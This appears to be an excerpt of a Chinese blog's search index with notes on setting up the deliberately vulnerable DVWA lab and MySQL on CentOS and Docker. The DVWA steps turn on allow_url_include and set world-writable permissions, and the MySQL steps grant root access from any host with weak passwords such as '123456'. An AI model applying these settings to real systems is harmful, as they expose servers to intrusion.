ed8410325b0e73466f935922427a9d633c0c387cc3f3af8164ecb93037e2a9298e911be0206bcea09f4b1cae9cca26738d7436069b475684adcf12f77b9a60e8574028c3e4e0be2ab529a2a6aae002924a11cd432c4975e5774da679307371618eac8c12501ba0d4f3718a4596346492729e35e59cb1f6192b1792a7633b57366aba249ea256395c1f7c6d617ff56ebc9bf246a6158308e7117e589b3477d4e966966df22ce42dcdb517e816396a0f29452823f2f004cab0d4b5ea91a9d2c8aec294895e5dc928799299673aff2827e3837fcf9e258e7f4a1d56edb135d841e747968a27a910e22a0b06f24097e444c9645b38292c92a787060657e1cea5d454234a394cdbc8e758b8ae3f8ecddfd541fffc5ebf71e689e3b17736f28111d8b525f87770e2ed206900b873a685d0b91ec255b4ee06425ac77f85022c2ab132d50681cb82d051e2f323043baeb7e4291a018bdf2cd4603c7b206f4a8327a0897831499712ef6271037f42340850173070463b39e5b54c2a5316d17d2039692cc310c4cdeb0050100624577ea0fa90821ea304996d44a3c759c8c36aef54dce4d7a9ed2e7344a6a74af16c3935e7c6263461116390f633061c0f5664473e76f86ee12ac2231bf4f7cdb5bc8409249b1a0bc432b4bc568af56bddeca318b132071bb8d1d27d822194760868d8cb91337037071d2c4ffdee08911e36116180cae3c485c10229f36577d9798dd8acb2e675cf4f02349d77c659105c33207e820069b1a8de022ed42f61fa532b1e56fedba2f6538ecc1ca8cda10f0e23ff787d40eefbc981e1a64e0ead2c6bf9d7fb097378d5f5d170e64e3f26e4da5ab19fb63897fbbe981bf59c299de4dd39b685a2999bdddce19848df7b76bacd8338d75ec01554b2759794451e8cf9a28f92ed2683169377bb066d6b86819dc01cb390e262fe5786f6b5c2b22ef0fb45b00f90ae87ae2fb0a1196d0f2ff06753db4d6e7bebe344de71409fc2b5bae6e52cbbb8c7ec8fa660a43728817b4f1224c69ac71b79c2718f6ac2b23ebbca018385e4aa2044fb961b6717286ca8d363afa5d8f457e4062a5e6853829b7867a4f4b557539c125a92623fe5a5f232e0175ff6cef65275b43490ec0c62e4b8ab1d9545894f498b34d29375300f089770ccadc9852078d29e4e75bf79ba648dfb77efb3e1e6a3b42b520ef8f202a07dc202ebfb4bbdcedc102f49ce0d4a924a95a9b9e767de9d0d09d7c07f849fa91d1655d885df267d08541ee5eaf234c845ab471b56e77dac61af3101ee3bc9e93618fc5e7065a57f94be40a0a818ec61208e5e02456d6296ad0caeabdee1a0342cb3ffcddc63c1d5b34025a93edc90f02ba065869dcf28e6c2acf8a3e3c274bc25c682289f13c55a38a67398c8d5fc864a46119e196d69d03c2377978818a2e3d591b98ff242fee9ecf4ba3e23ad4ea81d3c5790c113e5db95ccbdac0349f34ec871e6b0b2e92c684285dd1b2d2639d63099e1095560b5fa5aa706d3357b6f9eb9ad1dd3b37bd7fe493b54c21282286a42febc816e6d399b63ba22f0260e8e49a6955ccfa2b7378e86dc2c3e643d2e2bce058f0db0f5889e0f45026c0e62296b91f582a81ec9c216463b41cf2ec50d437bae07ffabf12dc550d3ccdfc8f622da93ac053f72486b68a0dbf93a083641458b35cc8afde4030d8b52c4a511748554d6087d601d47622d302c9ec130d505e4bfc45f4f8863192943c8ed018e7d4af287e3ab9426e2e0c0980dbce2af7fc038488547d43954034294fe67adef71d7842c06a8b05919e192988c81427cf4f3d55249f90df82f38648f46354647915c367b5f4a6e96c6e535616baf3f5759cdb2328c392a6b99a6469abe785e7bdcf141a08b2fee7dbe6a187bbdbc487813c3356220183553357127ae1d2982205fb53110986ea41da7a63d78601c4840809ccff89d476e38f6b330799525e1ce536c1b842380d9873b70c0e852cd98fbf4d52fc79886b41868c7a0f73b30771b7c6673cdbfe0a3e1d5b9444d64c7a5f6516e0048dca158f830e8f3071a837148877c61949c3f9918669a002bc2771df915bbf2a2362a80a1c06ee78b9f58eccb174cc438ec48040a313ca80727a0041d53dc9284ed0d9122659883cd6f4399e23d6796f6341554aa2677f79aeafc98b332ef06c240f265b4e072a92bd1114bab03252329a3daafeca1a3a057e32f7114e3d0532404f466accf8fd7966287df909ae4053296b4d361cf8c0b17d9ec4630291f791cd485ec81079e471154c6f759d42952dc5eb55c1b6e68ffbec9338ad418399102f8acef28ad85f842df6ef73d0ca8246c2b0ad25c2fc9501f4d8bd7fdf88d4670af85fd03680676e7cc50a67f35326d3ad6f7f5051a985d66c059fe6f0f221d5849b9e200c6effc5c71c6b744c4afffb66c109302e99f947b6e11d6cdf2a0f8405bf18063519d8c978449cbe6221da550886735bc58207486efc1ff83913c7c3750573760e882a31cd9cb45898426efb3f0367cf6a0c3cc11d9b174b565daad08063f4bf65b24eb96e217767207df50edc8881977a2f21ee68c72d7e78d2d138e6860049e6fbb37b07a721d8733ac5d520ec8c0fe2b874a15e0b300751b5f219186dc18d9711f1fa25c5da002aff53a115b3bf9e60ac8be20adfde0df1a17b7e0028d91e4c205675e56cfc06fed8665613b1973e29e21302d48817373a895a8d016964c8a904d365578767fb2ac9475b9528682f305ebe7bda3d10da22ff6375f8b7226eab23bda2f227c0b194c2d856e72fc9ab3ef0260ab5c7c45d7b987ed2a5352f954f8a3dfe26e50ad5155b7be0c05e520b822f28876ba8fa2c3f1690a1f69e4016cca509a2e826d11dd9c90b7f9c733a90c81224cf28c61bafb00a5bd55f8ab9f9ed914aabf52aac70a21d6d0e6dd13bc163081beaff3aa3f1db1698867bdd575657344bb6db07fa95694f7ce6d59ec3d01ae82c5dacc3696319bde8e65b3fb9280ff1e397796829f83bf69962b69d42e5e54c3e85c2f551b7b9936a871444c373d050a0f7aab65b3312cd1194de0670dd349f3c7fb6fef5597f9281c7d6845c32a0ce49fa218e367dfb3d9f9ded90c974dd5f6e05af3411d786ad209df6d3cffea6a5c26e455cceae9f0b8d5ebd7eab162b0cdfa6ef64dbf50a996797e9d9f79613922dab01ea3f28a59e98a7f50f8a1b45d77f0ad374e7f1b44e8bfe1685ad2b6f3a5ab3636ff67a9fa039bff37029c1fa5bee1d1c07273742d414f9208201a71f43fbed456163566f19415aa84cf2bdc14509fea1e031c2dfa61d9d91fd2bc0c55354581fd86c889cb78c5205d358cd318671c9e33fca74f0b992704702fe7ba5e1531a5b6aff458d55b5fe792a79997ca4c166bc88930524aa2b0ea1ee25fadbf965843e6c9aa5f2df6a5ea7892987f50332a99462bc6f6e00c87a3b3d3f7f58085aa</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 云原生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA初始化</title>
      <link href="/p/603ea0ad.html"/>
      <url>/p/603ea0ad.html</url>
      
        <content type="html"><![CDATA[<h2 id="centos7部署DVWA"><a href="#centos7部署DVWA" class="headerlink" title="centos7部署DVWA"></a>centos7部署DVWA</h2><h3 id="创建数据库和dvwa用户，设置远程访问"><a href="#创建数据库和dvwa用户，设置远程访问" class="headerlink" title="创建数据库和dvwa用户，设置远程访问"></a>创建数据库和dvwa用户，设置远程访问</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database dvwa;</span><br><span class="line">grant all on dvwa.* to dvwa@&#x27;%&#x27; identified by &#x27;dvwa12345&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h3 id="安装apache-php，启动httpd"><a href="#安装apache-php，启动httpd" class="headerlink" title="安装apache+php，启动httpd"></a>安装apache+php，启动httpd</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y install apache2 php php-mysqli php-gd libapache2-mod-php</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure><h3 id="验证php"><a href="#验证php" class="headerlink" title="验证php"></a>验证php</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?php\nphpinfo();\n?&gt;&quot; &gt; /var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure><p>开放防火墙</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h3 id="部署dvwa"><a href="#部署dvwa" class="headerlink" title="部署dvwa"></a>部署dvwa</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">git clone https://github.com/digininja/DVWA.git</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#太慢就直接下载zip上传上去</span></span></span><br><span class="line">unzip DVWA-master.zip</span><br><span class="line">mv DVWA-master dvwa</span><br><span class="line">cd /var/www/html/dvwa</span><br><span class="line">chmod -R 755 setup.php</span><br></pre></td></tr></table></figure><h4 id="初始化dvwa"><a href="#初始化dvwa" class="headerlink" title="初始化dvwa"></a>初始化dvwa</h4><p>访问<code>http://ip/dvwa/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA System error - config file not found. Copy config/config.inc.php.dist to config/config.inc.php and configure to your environment.</span><br></pre></td></tr></table></figure><p>进入<code>/var/www/html/dvwa/config</code>目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure><p><code>vim config.inc.php</code></p><p>配置数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_DVWA</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_server&#x27;</span> ]   = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_database&#x27;</span> ] = <span class="string">&#x27;dvwa&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;dvwa&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;dvwa12345&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_port&#x27;</span>] = <span class="string">&#x27;3306&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>注意这里要是localhost，127.0.0.1不行</p></blockquote><p>添加keys，可访问<a href="https://www.google.com/recaptcha/admin">这里</a>获取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   You&#x27;ll need to generate your own keys at: https://www.google.com/recaptcha/admin</span></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_public_key&#x27;</span> ]  = <span class="string">&#x27;6LePqhAUAAAAAH6Bn2okO9-8G-zNw46PNhotV4Q6&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ] = <span class="string">&#x27;6LePqhAUAAAAAMVqhBbFr1NVA9H13FKyfAgBeZYx&#x27;</span>;</span><br></pre></td></tr></table></figure><p>红字报错解决</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010184417942.png" alt="image-20211010184417942"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/php.ini</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 更改成如下配置</span></span></span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010184822844.png" alt="image-20211010184822844"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[User: root] Writable folder /var/www/html/dvwa/hackable/uploads/: **No**</span><br><span class="line">[User: root] Writable file /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt: **No**</span><br><span class="line">[User: root] Writable folder /var/www/html/dvwa/config: **No**</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /var/www/html/dvwa/hackableup/loads</span><br><span class="line">chmod 777 /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br></pre></td></tr></table></figure><p>配置完成后，重启httpd服务</p><p>登录用户名/密码 <code>admin/password</code></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/xjcn/p/12162437.html">https://www.cnblogs.com/xjcn/p/12162437.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySql初始化</title>
      <link href="/p/44ce2ff7.html"/>
      <url>/p/44ce2ff7.html</url>
      
        <content type="html"><![CDATA[<h2 id="yum安装Mysql"><a href="#yum安装Mysql" class="headerlink" title="yum安装Mysql"></a>yum安装Mysql</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y mysql</span><br></pre></td></tr></table></figure><mark class="hl-label red">报错</mark>  没有mysqld服务<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# systemctl start mysqld</span><br><span class="line">Failed to start mysqld.service: Unit not found.</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/yuanchaoyong/p/9749060.html">CentOS7安装mysql后无法启动服务，提示Unit not found</a></p><p>方法一：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb-server -y //如果已安装可以省略</span><br><span class="line">systemctl start mariadb.service //启动服务</span><br><span class="line">systemctl enable mariadb.service //开机启动服务</span><br><span class="line">mysql -u root -p //登录mysql</span><br></pre></td></tr></table></figure><blockquote><p>使用MariaDB代替mysql数据库（MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。）</p></blockquote><p>方法二：</p><p>这个方法就是在 <code>/etc/systemd/system/mysqld.service</code> 添加Unit,既然错误提示找不到Unit那我们添加一个就好了。在 <code>/etc/systemd/system/mysqld.service</code>下添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=MySQL Server</span><br><span class="line">After=network.target</span><br><span class="line"> </span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/bin/mysqld --defaults-file=/etc/mysql/my.cnf --datadir=/var/lib/mysql --socket=/var/run/mysqld/mysqld.sock User=mysql</span><br><span class="line">Group=mysql</span><br><span class="line">WorkingDirectory=/usr</span><br><span class="line"> </span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>然后运行：</p><p><code>systemctl daemon-reload</code></p><p>使用重启命令：</p><p><code>systemctl start mysql.service</code></p><h3 id="初始化MySQL"><a href="#初始化MySQL" class="headerlink" title="初始化MySQL"></a>初始化MySQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure><p>设置root用户&amp;移除匿名用户</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010163931661.png" alt="image-20211010163931661"></p><p>root远程登录数据库&amp;&amp;移除测试数据库&amp;&amp;重新载入权限表</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010164155395.png" alt="image-20211010164155395"></p><h3 id="允许远程访问"><a href="#允许远程访问" class="headerlink" title="允许远程访问"></a>允许远程访问</h3><h4 id="方法一：改表"><a href="#方法一：改表" class="headerlink" title="方法一：改表"></a>方法一：改表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set host=&#x27;%&#x27; where user=&#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><blockquote><p>在执行update命令的时候报以下错误</p></blockquote><mark class="hl-label red">报错</mark>   <p><code>ERROR 1062 (23000): Duplicate entry &#39;%-root&#39; for key &#39;PRIMARY&#39;</code></p><p>说明有多个ROOT用户纪录在USER表中，查看一下host是否已经有了%这个值，有就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host, user from user;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010170157216.png" alt="image-20211010170157216"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010170350732.png" alt="image-20211010170350732"></p><blockquote><p>使用Navicat连接数据库的时候报这个错误说明需要授权</p></blockquote><h4 id="方法二：授权"><a href="#方法二：授权" class="headerlink" title="方法二：授权"></a>方法二：授权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><blockquote><p>root使用123456从任何主机连接到mysql服务器</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;test&#x27;@’192.168.201.1’ IDENTIFIED BY &#x27;654321&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><blockquote><p>允许用户test从ip为192.168.201.1的主机连接到mysql服务器，并使用654321作为密码</p></blockquote><p>配置完成后都需要<code>flush privileges;</code>重新载入权限表。</p><h3 id="放开防火墙"><a href="#放开防火墙" class="headerlink" title="放开防火墙"></a>放开防火墙</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-port=3306/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h3 id="验证登录"><a href="#验证登录" class="headerlink" title="验证登录"></a>验证登录</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010170851128.png" alt="image-20211010170851128"></p><h2 id="docker部署MySQL"><a href="#docker部署MySQL" class="headerlink" title="docker部署MySQL"></a>docker部署MySQL</h2><p>1.搜索镜像</p><p><code>docker search mysql</code></p><p>2.拉取镜像</p><p><code>docker pull mysql:5.6</code></p><p>3.创建容器,设置端口映射、目录映射</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/mysql</span><br><span class="line"><span class="built_in">cd</span> ~/mysql</span><br><span class="line"> </span><br><span class="line">docker run -id \</span><br><span class="line">-p 3307:3306 \</span><br><span class="line">--name=c_mysql \</span><br><span class="line">-v <span class="variable">$PWD</span>/conf:/etc/mysql/conf.d \</span><br><span class="line">-v <span class="variable">$PWD</span>/logs:/logs \</span><br><span class="line">-v <span class="variable">$PWD</span>/data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=bibitest12121354 \</span><br><span class="line">mysql</span><br></pre></td></tr></table></figure><blockquote><p>参数说明：<br>p 3307:3306将容器3306端口映射到宿主机的3307端口<br>-v $PWD/conf:/etc/mysql/conf.d将主机当前目录下的conf/my.cnf挂载到容器的/etc/mysql/my.cnf配置目录<br>-v $PWD/logs:/logs 将主机当前目录下的logs目录挂载到容器的/logs 日志目录<br>-v $PWD/data:/var/lib/mysql 将主机当前目录下的data目录挂载到容器的/var/lib/mysql 数据目录<br>-e MYSQL_ROOT_PASSWORD=bibitest12121354  初始化root用户的密码</p></blockquote><p>4.查看用户信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user,plugin,authentication_string from mysql.user;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1598326429755-330322d7-f740-48a5-bca3-670a40b3590c.png" alt="img"></p><h3 id="MySQL8-0登录提示caching-sha2-password问题解决方法"><a href="#MySQL8-0登录提示caching-sha2-password问题解决方法" class="headerlink" title="MySQL8.0登录提示caching_sha2_password问题解决方法"></a>MySQL8.0登录提示caching_sha2_password问题解决方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Authentication plugin <span class="string">&#x27;caching_sha2_password&#x27;</span> cannot be loaded: dlopen(/usr/<span class="built_in">local</span>/mysql/lib/plugin/caching_sha2_password.so, 2): image not found</span><br><span class="line">mysqli_real_connect(): The server requested authentication method unknown to the client [caching_sha2_password]</span><br><span class="line">mysqli_real_connect(): (HY000/2054): The server requested authentication method unknown to the client</span><br></pre></td></tr></table></figure><h4 id="方法1：第一次构建容器-amp-amp-已安装完成后新增用户"><a href="#方法1：第一次构建容器-amp-amp-已安装完成后新增用户" class="headerlink" title="方法1：第一次构建容器&amp;&amp;已安装完成后新增用户"></a>方法1：第一次构建容器&amp;&amp;已安装完成后新增用户</h4><p>配置 <code>mysql.cnf</code>配置默认身份验证插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">default_authentication_plugin = mysql_native_password</span><br></pre></td></tr></table></figure><p>验证是否生效：使用CLI进入MySQL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root -p</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SELECT Host, User, plugin from user;</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| Host      | User             | plugin                |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| %         | root             | mysql_native_password |</span><br><span class="line">| localhost | mysql.infoschema | caching_sha2_password |</span><br><span class="line">| localhost | mysql.session    | caching_sha2_password |</span><br><span class="line">| localhost | mysql.sys        | caching_sha2_password |</span><br><span class="line">| localhost | root             | mysql_native_password |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><blockquote><p>root用户的身份验证器插件已经变为：<strong>mysql_native_password</strong></p></blockquote><h4 id="方法2：当MySQL-已成功安装完成后"><a href="#方法2：当MySQL-已成功安装完成后" class="headerlink" title="方法2：当MySQL 已成功安装完成后"></a>方法2：当MySQL 已成功安装完成后</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT Host, User, plugin from user;</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| Host      | User             | plugin                |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| %         | root             | caching_sha2_password |</span><br><span class="line">| localhost | mysql.infoschema | caching_sha2_password |</span><br><span class="line">| localhost | mysql.session    | caching_sha2_password |</span><br><span class="line">| localhost | mysql.sys        | caching_sha2_password |</span><br><span class="line">| localhost | root             | caching_sha2_password |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>修改身份验证类型(修改密码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;root&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;123456&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure><p>刷新权限：<code>FLUSH PRIVILEGES;</code></p><p>修改结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT Host, User, plugin from user;</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| Host      | User             | plugin                |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| %         | root             | mysql_native_password |</span><br><span class="line">| localhost | mysql.infoschema | caching_sha2_password |</span><br><span class="line">| localhost | mysql.session    | caching_sha2_password |</span><br><span class="line">| localhost | mysql.sys        | caching_sha2_password |</span><br><span class="line">| localhost | root             | mysql_native_password |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
            <tag> MySql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL漏洞利用与提权</title>
      <link href="/p/9409b6b3.html"/>
      <url>/p/9409b6b3.html</url>
      
